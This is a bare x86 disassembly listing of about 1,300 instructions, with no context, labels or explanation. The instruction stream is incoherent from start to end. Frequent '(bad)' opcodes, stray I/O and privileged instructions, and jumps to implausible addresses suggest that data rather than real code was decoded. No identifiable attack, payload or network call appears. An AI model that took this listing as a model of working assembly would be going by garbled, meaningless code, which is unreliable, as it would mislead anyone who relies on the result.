  43029f:	pop    ecx
  4302a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302a1:	dec    ebp
  4302a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4302a8:	jne    0x4302f4
  4302aa:	lea    eax,[eax]
  4302ac:	push   eax
  4302ad:	(bad)  
  4302ae:	dec    DWORD PTR [eax]
  4302b0:	mov    DWORD PTR [eax],eax
  4302b2:	test   al,0x0
  4302b4:	add    BYTE PTR [ebp-0x18],cl
  4302b7:	xor    ebp,DWORD PTR [ebx]
  4302b9:	add    eax,DWORD PTR [eax]
  4302bb:	mov    eax,eax
  4302bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302c4:	inc    ebp
  4302c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4302cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4302d1:	sub    al,0x80
  4302d3:	inc    DWORD PTR [ecx]
  4302d5:	lea    eax,[eax]
  4302d7:	or     al,0x0
  4302d9:	inc    DWORD PTR [ecx-0x18]
  4302dc:	mov    ecx,DWORD PTR [ebx]
  4302de:	cld    
  4302df:	add    BYTE PTR [ecx+0x75014d],cl
  4302e5:	(bad)  
  4302e6:	xchg   ebp,eax
  4302e7:	fdivr  st,st(7)
  4302e9:	inc    eax
  4302ea:	inc    DWORD PTR [eax]
  4302ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4302ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4302f5:	add    BYTE PTR [edx],dl
  4302f7:	enter  0x4d90,0x0
  4302fb:	mov    eax,DWORD PTR [eax]
  4302fd:	hlt    
  4302fe:	add    al,0xa5
  430300:	mov    al,0xff
  430302:	add    bh,bh
  430304:	add    BYTE PTR [ebx],dh
  430306:	inc    DWORD PTR [ebx]
  430308:	sbb    al,0x89
  43030a:	jne    0x4302e8
  43030c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430312:	mov    eax,DWORD PTR [ebp-0xff0048]
  430318:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43031f:	inc    DWORD PTR [ebp-0x75]
  430322:	fisttp QWORD PTR [esi+ebp*8]
  430325:	test   DWORD PTR [esi-0x1],esp
  430328:	inc    ebp
  430329:	(bad)  
  43032a:	aas    
  43032b:	inc    ebp
  43032c:	(bad)  
  43032d:	lea    edi,[esp+eiz*2-0x1]
  430331:	inc    edi
  430333:	mov    DWORD PTR ds:0x8000c7a0,edi
  430339:	mov    ebp,esp
  43033b:	cld    
  43033c:	loop   0x4302cb
  43033e:	inc    ebp
  43033f:	(bad)  
  430340:	out    dx,al
  430341:	(bad)  
  430342:	fisttp WORD PTR [eax+0x8801c7]
  430348:	jecxz  0x43038f
  43034a:	in     al,dx
  43034b:	inc    DWORD PTR [ebp-0x4]
  43034e:	out    0x8d,eax
  430350:	aas    
  430351:	inc    edi
  430353:	jmp    FWORD PTR [eax-0x78]
  430356:	inc    DWORD PTR [ecx]
  430358:	mov    DWORD PTR [eax],0xc7043d
  43035e:	ins    BYTE PTR es:[edi],dx
  43035f:	test   edi,edi
  430361:	pandn  mm0,mm5
  430364:	aas    
  430365:	add    bh,al
  430367:	mov    esi,DWORD PTR [eax-0x4]
  43036a:	inc    DWORD PTR [eax+0xdf01ee]
  430370:	(bad)  
  430371:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430375:	mov    ebp,ebx
  430377:	xchg   esp,eax
  430378:	fild   DWORD PTR [eax]
  43037a:	(bad)  
  43037b:	mov    edi,DWORD PTR [eax+0x3]
  43037e:	(bad)  
  43037f:	cmp    al,0xe7
  430381:	dec    ebp
  430382:	leave  
  430383:	mov    ebp,eax
  430385:	fsubr  DWORD PTR [edx]
  430387:	add    BYTE PTR [eax],al
  430389:	lea    ecx,[ebx-0x7f0003b4]
  43038f:	push   edx
  430390:	add    DWORD PTR [ebp+0x0],edx
  430393:	mov    esi,DWORD PTR [eax]
  430395:	mov    WORD PTR [edi],ss
  430397:	add    BYTE PTR [eax],al
  430399:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43039f:	add    ah,bh
  4303a1:	push   0x7d
  4303a3:	dec    DWORD PTR [ebx+0xd88c]
  4303a9:	push   edx
  4303aa:	mov    edx,DWORD PTR [ecx-0x4]
  4303ad:	call   DWORD PTR [eax+0x7d01fc]
  4303b3:	mov    esi,DWORD PTR [esi]
  4303b5:	cld    
  4303b6:	add    BYTE PTR [eax+0x560150],dl
  4303bc:	test   DWORD PTR [ebp+0x75],eax
  4303bf:	loop   0x43034c
  4303c1:	jmp    0xe38b:0x947dc7fc
  4303c8:	fsub   st,st(7)
  4303ca:	add    bh,al
  4303cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4303d2:	add    edi,edi
  4303d4:	add    bh,bh
  4303d6:	adc    al,0xed
  4303d8:	add    dh,ah
  4303da:	push   eax
  4303db:	inc    ebp
  4303dc:	push   esi
  4303dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4303e3:	test   BYTE PTR [ebx],dh
  4303e5:	out    0x5,al
  4303e7:	shl    BYTE PTR [edx+0x45],0x0
  4303eb:	jmp    0x4303ae
  4303ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4303f4:	inc    esi
  4303f5:	jle    0x4303f7
  4303f7:	test   edi,eax
  4303f9:	(bad)  
  4303fa:	call   0x13004fe
  4303ff:	out    0x75,al
  430401:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430407:	in     al,dx
  430408:	mov    esp,edx
  43040a:	mov    ah,0x85
  43040c:	add    bh,bh
  43040e:	call   0x1292e12
  430413:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43041a:	add    ebx,esp
  43041c:	add    ah,ch
  43041e:	xor    BYTE PTR [ebp-0xff0073],al
  430424:	mov    ebx,ebp
  430426:	cld    
  430427:	jle    0x4303b2
  430429:	add    DWORD PTR gs:[eax],eax
  43042c:	add    BYTE PTR [eax+0x1],dl
  43042f:	inc    ebp
  430430:	inc    ebp
  430431:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430437:	dec    DWORD PTR [ebx-0x3fd80318]
  43043d:	add    BYTE PTR [ebp-0xbf0040],dl
  430443:	inc    ebp
  430444:	fmul   QWORD PTR [ebx-0x4faf0400]
  43044a:	inc    ebp
  43044b:	add    DWORD PTR [ebx+0x459c00],ecx
  430451:	mov    edi,edi
  430453:	mov    eax,0xe80800ff
  430458:	inc    ebp
  430459:	sub    cl,BYTE PTR [ebx-0x47000400]
  43045f:	add    al,0x1
  430461:	rol    BYTE PTR [eax],0x1e
  430464:	jne    0x4304ab
  430466:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43046c:	inc    DWORD PTR [ecx]
  43046e:	call   0x882d73
  430473:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430479:	call   0x432e7f
  43047e:	xor    bh,bh
  430480:	push   edi
  430481:	adc    BYTE PTR [ebx-0x74741bbb],al
  430487:	fsub   st,st(4)
  430489:	ret    
  43048a:	loopne 0x430427
  43048c:	xor    DWORD PTR [edx],0x31
  43048f:	cmp    edi,edi
  430491:	bswap  eax
  430493:	rol    BYTE PTR gs:[eax],0x5
  430497:	jmp    0x12e05e1
  43049c:	mov    eax,DWORD PTR [ebp-0x4]
  43049f:	add    BYTE PTR [eax+0xff0100],bh
  4304a5:	cld    
  4304a6:	jne    0x430525
  4304a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4304ae:	jb     0x4304b1
  4304b0:	add    BYTE PTR [eax],al
  4304b2:	push   eax
  4304b3:	fild   DWORD PTR [ebp+0x0]
  4304b6:	mov    edx,DWORD PTR [eax-0x68]
  4304b9:	inc    ebp
  4304ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4304c0:	or     bh,bh
  4304c2:	inc    ebp
  4304c3:	call   0x1272bc7
  4304c8:	jge    0x430517
  4304ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4304d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4304d6:	fwait
  4304d7:	mov    eax,0x30132
  4304dc:	lea    esi,[ebp+0x2c]
  4304df:	xor    edi,edi
  4304e1:	(bad)  
  4304e2:	call   0x1422e4f
  4304e7:	call   0x1372e77
  4304ec:	jne    0x430479
  4304ee:	xor    edi,esp
  4304f0:	add    eax,DWORD PTR [eax+0xc018d]
  4304f6:	push   DWORD PTR [eax]
  4304f8:	call   0xcc2e54
  4304fd:	enter  0x45ff,0xe0
  430501:	mov    ecx,DWORD PTR [ebp-0x28]
  430504:	xor    eax,DWORD PTR [eax]
  430506:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43050c:	(bad)  
  43050d:	xchg   ebp,eax
  43050e:	call   0x1420612
  430513:	mov    cl,0x45
  430515:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43051b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430522:	mov    edi,edi
  430524:	or     BYTE PTR [eax],cl
  430526:	inc    ebp
  430527:	test   DWORD PTR gs:[eax],eax
  43052a:	je     0x430571
  43052c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430532:	xor    edx,DWORD PTR [eax-0x73]
  430535:	push   ebp
  430536:	or     BYTE PTR [ebp+0x21007572],al
  43053c:	inc    ebp
  43053d:	loopne 0x4304ca
  43053f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430546:	int    0x0
  430548:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43054e:	inc    ebp
  43054f:	push   ebp
  430550:	cmp    ebp,eax
  430552:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430559:	cld    
  43055a:	fadd   QWORD PTR [eax+0x3b014d]
  430560:	jne    0x430592
  430562:	push   0xf8898557
  430567:	loopne 0x4305de
  430569:	inc    ebp
  43056a:	lea    eax,[ebx+0x72e8e4cc]
  430570:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430576:	jmp    0x4305ab
  430578:	mov    edi,DWORD PTR [edi+0x4572bc]
  43057e:	xor    eax,edi
  430580:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43058a:	rcl    BYTE PTR [eax-0x40],1
  43058d:	inc    ebp
  43058e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430596:	inc    ebp
  430597:	xchg   ebp,eax
  430598:	ud0    ebp,DWORD PTR [ebx]
  43059b:	inc    DWORD PTR [eax]
  43059d:	daa    
  43059e:	jbe    0x4305a0
  4305a0:	mov    dl,BYTE PTR [eax-0x80]
  4305a3:	push   ebp
  4305a4:	pop    ds
  4305a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4305a8:	inc    eax
  4305a9:	retf   
  4305aa:	inc    ebp
  4305ab:	iret   
  4305ac:	jb     0x430576
  4305ae:	mov    eax,DWORD PTR [edi]
  4305b0:	int3   
  4305b1:	inc    ebp
  4305b2:	inc    ebp
  4305b3:	add    DWORD PTR [ecx],esi
  4305b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4305bc:	xor    dh,BYTE PTR [ebx]
  4305be:	pushf  
  4305bf:	lea    ecx,[ecx+0x4d72d808]
  4305c5:	add    BYTE PTR [ebx],dh
  4305c7:	inc    ebp
  4305c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4305ce:	xor    dl,BYTE PTR [edx]
  4305d0:	add    eax,DWORD PTR [ebp-0x77]
  4305d3:	mov    eax,esp
  4305d5:	fmul   QWORD PTR [ebp-0x3d]
  4305d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4305df:	mov    DWORD PTR [ebp-0x24],eax
  4305e2:	rol    DWORD PTR [ebp-0x64],1
  4305e5:	xor    eax,edi
  4305e7:	mov    ecx,0xff858db0
  4305ec:	clc    
  4305ed:	enter  0x4d45,0x3c
  4305f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4305f8:	test   esi,edi
  4305fa:	clc    
  4305fb:	inc    DWORD PTR [ebp+0x45]
  4305fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430606:	test   DWORD PTR [ecx],esi
  430608:	clc    
  430609:	pushf  
  43060a:	inc    ebp
  43060b:	(bad)  
  43060c:	cmp    ah,bh
  43060e:	pushf  
  43060f:	inc    ebp
  430610:	mov    edx,DWORD PTR [eax-0x24]
  430613:	add    BYTE PTR [ebp+0x0],dl
  430616:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43061c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430620:	add    al,dl
  430622:	jmp    0x10407f2
  430627:	jb     0x430676
  430629:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43062f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430632:	xor    ecx,DWORD PTR [edi]
  430634:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430638:	(bad)  
  43063a:	clc    
  43063b:	int3   
  43063c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430643:	push   cs
  430644:	xor    ecx,eax
  430646:	xor    esp,ecx
  430648:	add    ebp,DWORD PTR [eax]
  43064a:	add    esi,DWORD PTR [eax]
  43064c:	(bad)  
  43064e:	retf   0x55cc
  430651:	repnz mov eax,DWORD PTR [ebp-0x10]
  430655:	(bad)  
  430656:	cli    
  430657:	fdiv   st(1),st
  430659:	test   DWORD PTR [eax+edi*8],ecx
  43065c:	dec    ebp
  43065d:	inc    ebp
  43065e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430664:	add    BYTE PTR [ebp+0x0],al
  430667:	mov    ecx,DWORD PTR [ebp-0x24]
  43066a:	mov    ecx,ebx
  43066c:	clc    
  43066d:	jne    0x43063a
  43066f:	mov    esi,0xd672d3
  430674:	into   
  430675:	into   
  430676:	scas   eax,DWORD PTR es:[edi]
  430677:	dec    ebp
  430678:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43067e:	sub    ecx,esi
  430680:	cmp    ecx,DWORD PTR [ebp+0x77]
  430683:	(bad)  
  430684:	mov    edi,eax
  430686:	mov    al,0x85
  430688:	mov    eax,edi
  43068a:	add    BYTE PTR [ebp-0x75],al
  43068d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430694:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43069a:	(bad)  
  43069c:	retf   0x559c
  43069f:	(bad)  
  4306a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4306a7:	inc    ebp
  4306a8:	add    eax,0xeb9c4d3f
  4306ad:	(bad)  
  4306ae:	mov    ecx,eax
  4306b0:	lods   al,BYTE PTR ds:[esi]
  4306b1:	test   DWORD PTR [ebp-0x8],edx
  4306b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4306b7:	mov    eax,DWORD PTR [ebx]
  4306b9:	lock add ecx,ebx
  4306bc:	bswap  esi
  4306be:	retf   0x55d1
  4306c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4306c7:	jmp    0x4306c2
  4306c9:	add    BYTE PTR ds:0xebc44d8b,al
  4306cf:	push   ebp
  4306d0:	mov    ebp,DWORD PTR [ebx]
  4306d2:	test   al,0x8b
  4306d4:	push   ebp
  4306d5:	clc    
  4306d6:	xor    ecx,ebx
  4306d8:	xor    ecx,esi
  4306da:	add    edx,ecx
  4306dc:	add    eax,DWORD PTR [edx+0xca010f]
  4306e2:	push   ebp
  4306e3:	dec    ebp
  4306e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4306ea:	stc    
  4306eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4306f1:	scas   eax,DWORD PTR es:[edi]
  4306f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4306f8:	xor    ebp,DWORD PTR [ebx]
  4306fa:	xor    edi,DWORD PTR [ebx]
  4306fc:	add    esi,DWORD PTR [edi+0x3]
  4306ff:	mov    ecx,DWORD PTR [edi]
  430701:	clc    
  430702:	retf   0x55cb
  430705:	into   
  430706:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43070d:	mov    eax,0x3376554d
  430712:	mov    esi,DWORD PTR [ebx]
  430714:	enter  0x5503,0x3
  430718:	xor    ecx,DWORD PTR [edi]
  43071a:	xor    ecx,edx
  43071c:	add    edx,DWORD PTR [ebp+0x3]
  43071f:	mov    ecx,DWORD PTR [edi]
  430721:	lock retf 0x4dfa
  430725:	stc    
  430726:	mov    ecx,DWORD PTR [eax]
  430728:	or     BYTE PTR [ebp+0x4d],cl
  43072b:	jmp    0x10707bb
  430730:	dec    ebp
  430731:	dec    ebp
  430732:	(bad)  
  430733:	mov    esp,esp
  430735:	clc    
  430736:	test   ebx,ecx
  430738:	clc    
  430739:	ror    DWORD PTR [ebp-0x2a],cl
  43073c:	mov    esi,ecx
  43073e:	in     al,dx
  43073f:	scas   eax,DWORD PTR es:[edi]
  430740:	inc    ebp
  430741:	mov    esi,DWORD PTR [ebx]
  430743:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43074a:	retf   
  43074b:	ja     0x43071b
  43074d:	mov    ebp,DWORD PTR [eax-0x48]
  430750:	dec    ebp
  430751:	xor    ecx,DWORD PTR [di+0x3]
  430755:	mov    ebp,eax
  430757:	clc    
  430758:	push   ebp
  430759:	retf   
  43075a:	mov    dl,bl
  43075c:	adc    esi,edx
  43075e:	jb     0x43072e
  430760:	add    BYTE PTR [edi-0x3b7474b3],ch
  430766:	in     al,dx
  430767:	jge    0x430734
  430769:	sub    ecx,DWORD PTR [ebp+0x3b]
  43076c:	mov    esi,DWORD PTR [edi-0x24]
  43076f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430776:	mov    BYTE PTR [ebx-0x34b20729],cl
  43077c:	mov    edx,ebx
  43077e:	in     al,dx
  43077f:	(bad)  
  430780:	ror    esi,cl
  430782:	push   ebp
  430783:	scas   eax,DWORD PTR es:[edi]
  430784:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43078a:	fwait
  43078b:	sub    esi,DWORD PTR [edx]
  43078d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430793:	lods   al,BYTE PTR ds:[esi]
  430794:	xor    esp,DWORD PTR [ebx]
  430796:	add    ecx,DWORD PTR [ebp-0x18]
  430799:	mov    edi,DWORD PTR [ebp-0x8]
  43079c:	mov    bl,cl
  43079e:	cmp    dl,bl
  4307a0:	jb     0x430770
  4307a2:	add    dh,dl
  4307a4:	dec    ebp
  4307a5:	scas   eax,DWORD PTR es:[edi]
  4307a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4307ac:	shr    DWORD PTR [ebx],cl
  4307ae:	into   
  4307af:	cmp    edx,esi
  4307b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4307b7:	dec    ebp
  4307b8:	dec    ebp
  4307b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4307bf:	retf   
  4307c0:	xor    edx,esi
  4307c2:	add    ecx,esi
  4307c4:	imul   ecx,edx
  4307c7:	mov    DWORD PTR [ebp+0x8],edx
  4307ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4307cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4307d3:	add    esi,DWORD PTR [ebx]
  4307d5:	mov    ah,0x3
  4307d7:	inc    ebp
  4307d8:	rdtsc  
  4307da:	xlat   BYTE PTR ds:[ebx]
  4307db:	pushf  
  4307dc:	jge    0x430767
  4307de:	xor    ebx,esp
  4307e0:	sub    eax,DWORD PTR [ebp-0x73]
  4307e3:	(bad)  
  4307e4:	cmp    al,al
  4307e6:	jb     0x43076d
  4307e8:	add    al,bh
  4307ea:	ror    DWORD PTR [ebp-0x7a],1
  4307ed:	xor    edi,edi
  4307ef:	add    edi,edi
  4307f1:	jmp    0x430840
  4307f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4307f9:	dec    ebp
  4307fa:	into   
  4307fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430801:	fwait
  430802:	shl    DWORD PTR [edx],cl
  430804:	retf   0x5588
  430807:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43080d:	add    eax,DWORD PTR [eax]
  43080f:	call   0x8ace5d61
  430814:	fcom   DWORD PTR [ecx]
  430816:	retf   
  430817:	jb     0x43087e
  430819:	add    ch,cl
  43081b:	dec    ebp
  43081c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430822:	dec    ebp
  430823:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430829:	jge    0x4307f9
  43082b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430831:	add    cl,dh
  430833:	dec    ebp
  430834:	dec    DWORD PTR [ebx-0x2c031b75]
  43083a:	adc    BYTE PTR [ebp+0x1],0x8b
  43083e:	add    ah,bl
  430840:	jge    0x4307ce
  430842:	push   0xffffff9b
  430844:	push   0x8b3032
  430849:	shl    BYTE PTR [ebp+0x55],0x6a
  43084d:	xor    edi,edi
  43084f:	xor    edx,DWORD PTR [ebx+eax*1]
  430852:	inc    ebp
  430853:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430859:	dec    ebp
  43085a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430860:	jbe    0x4307ed
  430862:	mov    esp,eax
  430864:	ror    bl,1
  430866:	enter  0x14ce,0xaf
  43086a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430870:	push   ebp
  430871:	retf   0x5540
  430874:	push   ebp
  430875:	mov    esi,DWORD PTR [edx-0x18]
  430878:	mov    edx,ebx
  43087a:	cld    
  43087b:	(bad)  
  43087c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430883:	sti    
  430884:	add    dh,cl
  430886:	push   0xffffff94
  430888:	call   FWORD PTR [ebx+0x3b5032d0]
  43088e:	mov    ecx,DWORD PTR [edi]
  430890:	enter  0x455e,0xff
  430894:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43089a:	xor    esi,DWORD PTR [ebx]
  43089c:	mov    DWORD PTR [ebx],0xcace0f9c
  4308a2:	aas    
  4308a3:	push   ebp
  4308a4:	inc    ebp
  4308a5:	xor    edx,esi
  4308a7:	add    edx,esi
  4308a9:	mov    eax,DWORD PTR [ebx]
  4308ab:	(bad)  
  4308ac:	jmp    0x43083a
  4308ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4308b4:	rol    ah,1
  4308b6:	mov    esi,0xf133104d
  4308bb:	mov    edx,0xff388d80
  4308c0:	mov    dh,0xd1
  4308c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4308c5:	mov    eax,DWORD PTR [edx-0x28]
  4308c8:	add    BYTE PTR [ebp-0x75],bh
  4308cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4308d2:	fwait
  4308d3:	retf   0x8632
  4308d6:	cmp    ebp,0x8
  4308d9:	call   ebx
  4308db:	inc    ebp
  4308dc:	inc    ebp
  4308dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4308e3:	mov    esi,DWORD PTR [ecx]
  4308e5:	int3   
  4308e6:	pushf  
  4308e7:	add    al,0xc7
  4308e9:	add    al,al
  4308eb:	add    bl,al
  4308ed:	(bad)  
  4308ee:	clc    
  4308ef:	int3   
  4308f0:	inc    ebp
  4308f1:	add    BYTE PTR [ecx],dh
  4308f3:	push   eax
  4308f4:	pushf  
  4308f5:	mov    edi,eax
  4308f7:	enter  0xc008,0x85
  4308fb:	aas    
  4308fc:	clc    
  4308fd:	gs inc ebp
  4308ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430905:	push   ss
  430906:	xor    ecx,DWORD PTR [ebp+0x3]
  430909:	sub    edx,DWORD PTR [ecx-0x76]
  43090c:	dec    ebp
  43090d:	add    DWORD PTR [ebx+0x88d845],ecx
  430913:	mov    esi,DWORD PTR [ebx]
  430915:	or     BYTE PTR [ebx],al
  430917:	cmp    edx,DWORD PTR [ecx-0x34]
  43091a:	dec    ebp
  43091b:	out    dx,eax
  43091c:	xor    eax,DWORD PTR [ebp+0x3]
  43091f:	mov    edx,DWORD PTR [ecx-0x28]
  430922:	dec    ebp
  430923:	add    BYTE PTR [ebx],dh
  430925:	push   0x518003
  43092a:	push   eax
  43092b:	add    BYTE PTR [ebx-0x300748b],cl
  430931:	sbb    BYTE PTR [ebp+0x45],cl
  430934:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43093a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430940:	dec    ebp
  430941:	inc    ebp
  430942:	xor    edx,esi
  430944:	add    edx,esi
  430946:	push   ecx
  430947:	(bad)  
  430948:	dec    ebp
  430949:	mov    al,ds:0xc5d83dff
  43094e:	retf   
  43094f:	(bad)  
  430950:	into   
  430951:	sub    bh,bh
  430953:	dec    esp
  430954:	adc    al,0x9c
  430956:	inc    ebp
  430957:	push   ebp
  430958:	test   DWORD PTR [edi],ecx
  43095a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430961:	jmp    0xc9bc1875
  430966:	add    cl,dl
  430968:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430972:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430978:	rol    BYTE PTR [eax],0x54
  43097b:	clc    
  43097c:	gs jb  0x430986
  43097f:	mov    eax,DWORD PTR [ebp-0x30]
  430982:	xor    al,0x40
  430984:	sub    al,0xc7
  430986:	mov    al,ah
  430988:	add    DWORD PTR [ebp+0x4534f845],eax
  43098e:	sub    al,0x80
  430990:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430997:	mov    ch,0xff
  430999:	clc    
  43099a:	add    DWORD PTR [ebp+0x60],0x3d
  43099e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4309a5:	inc    ebp
  4309a6:	dec    DWORD PTR [ebx-0x3427f701]
  4309ac:	test   esi,ecx
  4309ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4309b4:	push   eax
  4309b5:	add    DWORD PTR [ebp+0x0],eax
  4309b8:	dec    ebx
  4309ba:	or     al,0xce
  4309bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4309c3:	into   
  4309c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4309ca:	mov    esi,ecx
  4309cc:	sar    bh,0x45
  4309cf:	adc    al,0x8b
  4309d1:	clc    
  4309d2:	fadd   DWORD PTR [ebp+0x0]
  4309d5:	mov    ebp,DWORD PTR [edx+0x8]
  4309d8:	push   edi
  4309d9:	adc    BYTE PTR [eax+0x1],0x83
  4309dd:	add    al,al
  4309df:	retf   
  4309e0:	mov    ecx,esi
  4309e2:	cld    
  4309e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4309e9:	into   
  4309ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4309f0:	jne    0x430a25
  4309f2:	inc    DWORD PTR [ebx]
  4309f4:	rcl    BYTE PTR [ecx+0x50],1
  4309f7:	push   eax
  4309f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4309fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430a05:	sar    bh,0x84
  430a08:	or     BYTE PTR [ebx],al
  430a0a:	push   eax
  430a0b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430a11:	pushf  
  430a12:	xor    edi,eax
  430a14:	pushf  
  430a15:	mov    ah,0x89
  430a17:	test   esp,ebp
  430a19:	clc    
  430a1a:	inc    ebp
  430a1b:	inc    ebp
  430a1c:	mov    DWORD PTR [eax+eax*8],esi
  430a1f:	sub    al,0x32
  430a21:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430a28:	dec    ebp
  430a29:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a2d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430a33:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a37:	or     DWORD PTR [ecx+0x45ff085c],0x0
  430a3e:	shl    DWORD PTR [ebp-0x380064],1
  430a44:	enter  0x858d,0x60
  430a48:	clc    
  430a49:	inc    DWORD PTR [ebp+0x50]
  430a4c:	cmp    al,0x75
  430a4e:	pushf  
  430a4f:	(bad)  
  430a50:	(bad)  
  430a51:	pop    esp
  430a52:	lods   al,BYTE PTR ds:[esi]
  430a53:	inc    DWORD PTR [ebp+0x4508f8ff]
  430a59:	mov    edi,DWORD PTR [esi]
  430a5b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430a62:	test   DWORD PTR [edi-0x8],edx
  430a65:	sbb    al,0x45
  430a67:	add    BYTE PTR [eax],bh
  430a69:	push   0x8b809c
  430a6e:	loopne 0x430ab5
  430a70:	push   ebp
  430a71:	mov    esi,DWORD PTR [ebx]
  430a73:	cld    
  430a74:	add    eax,DWORD PTR [eax+0xf013b]
  430a7a:	adc    al,0x0
  430a7c:	add    bh,bh
  430a7e:	jmp    0xc00b9b
  430a83:	add    BYTE PTR [ebp+0x45],cl
  430a86:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a8c:	dec    ebp
  430a8d:	push   0x38033
  430a92:	cmp    eax,DWORD PTR [eax]
  430a94:	unpcklps xmm7,xmm0
  430a97:	jne    0x430a99
  430a99:	dec    DWORD PTR [ebx+0x5545c818]
  430a9f:	mov    DWORD PTR [ebx],esi
  430aa1:	shl    BYTE PTR [ebx],1
  430aa3:	inc    ebp
  430aa4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430aaa:	retf   0x5575
  430aad:	dec    DWORD PTR [ebx-0x5ba13e8]
  430ab3:	(bad)  
  430ab4:	stc    
  430ab5:	loopne 0x430ac3
  430ab7:	test   DWORD PTR [ebp-0x8],ecx
  430aba:	xor    eax,DWORD PTR [ebp+0x3]
  430abd:	mov    ebp,ecx
